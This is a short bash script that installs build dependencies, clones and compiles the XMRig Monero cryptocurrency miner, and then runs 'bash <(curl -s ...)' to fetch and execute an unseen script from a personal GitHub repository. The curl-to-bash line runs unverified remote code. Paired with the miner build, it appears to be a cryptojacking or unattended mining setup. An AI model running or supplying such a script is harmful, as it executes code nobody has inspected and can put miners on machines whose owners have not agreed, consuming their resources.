#!/bin/bash  
sudo apt update
sudo apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build
cd build
cmake ..
make
bash <(curl -s https://raw.githubusercontent.com/Kazhna/XMR/main/2.sh)
